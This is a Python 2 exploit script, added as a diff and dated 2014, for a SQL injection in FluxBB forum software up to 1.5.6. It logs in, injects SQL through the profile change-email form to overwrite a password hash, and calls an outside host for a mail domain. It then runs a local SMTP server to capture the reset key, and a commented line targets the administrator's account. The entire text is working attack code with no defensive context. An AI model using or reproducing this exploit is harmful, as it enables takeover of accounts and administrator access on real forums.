@@ -1,0 +1,66 @@
+#!/usr/bin/env python
+# Friday, November 21, 2014 - secthrowaway () safe-mail net
+# FluxBB <= 1.5.6 SQL Injection
+# make sure that your IP is reachable
+
+url  = 'http://target.tld/forum/'
+user = 'user' # dummy account
+pwd  = 'test' 
+
+import urllib, sys, smtpd, asyncore, re, sha
+from email import message_from_string
+from urllib2 import Request, urlopen
+
+ua = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36"
+bindip = '0.0.0.0'
+
+def stage1(sql):
+	if len(sql) > 80:
+		sys.exit('SQL too long, max 80 chars')
+	print "1st stage: %s (%d chars)" % (sql, len(sql))
+	r = urlopen(Request('%sprofile.php?action=change_email&id=%s' % (url, uid), data="form_sent=1&req_new_email=%s&req_password=%s&new_email=Submit" % (urllib.quote(sql), pwd), headers={"Referer": "%sprofile.php" % url, "User-agent": ua, "Cookie": cookie})).read()
+	if 'An email has been sent to the specified address' not in r:
+		sys.exit('err')
+
+def stage3(key):
+	print "3rd stage, using key: %s" % key
+	r = urlopen(Request('%sprofile.php?action=change_pass&id=%s&key=%s' % (url, uid, key), headers={"User-agent": ua})).read()
+	if 'Your password has been updated' in r:
+		print 'success'
+	else:
+		print 'err'
+
+class stage2_smtp(smtpd.SMTPServer):
+	def process_message(self, peer, mailfrom, rcpttos, data):
+		print '2nd stage: got mail', peer, mailfrom, "to:", rcpttos
+		key = re.search("(https?://.*&key=([^\s]+))", message_from_string(data).get_payload(decode=True), re.MULTILINE)
+		if key is not None: 
+			raise asyncore.ExitNow(key.group(2))
+		return
+
+def login():
+	print "logging in"
+	r = urlopen(Request('%slogin.php?action=in' % url, data="form_sent=1&req_username=%s&req_password=%s" % (user, pwd), headers={"User-agent": ua}))
+	try:
+		t = r.info()['set-cookie'].split(';')[0]
+		return (t.split('=')[1].split('%7C')[0], t)
+	except:
+		sys.exit('unable to login, check user/pass')
+
+uid, cookie = login()
+
+email_domain = urlopen(Request('http://tns.re/gen')).read()
+print "using domain: %s" % email_domain
+
+#this will change your password to your password :)
+stage1('%s\'/**/where/**/id=%s#@%s' % (sha.new(pwd).hexdigest(), uid, email_domain))
+
+#this will change admin's (uid=2) password "123456"
+#stage1('%s\'/**/where/**/id=%s#@%s' % (sha.new("123456").hexdigest(), 2, email_domain))
+
+try:
+	print "2nd stage: waiting for mail"
+	server = stage2_smtp((bindip, 25), None)
+	asyncore.loop()
+except asyncore.ExitNow, key:
+	stage3(key)
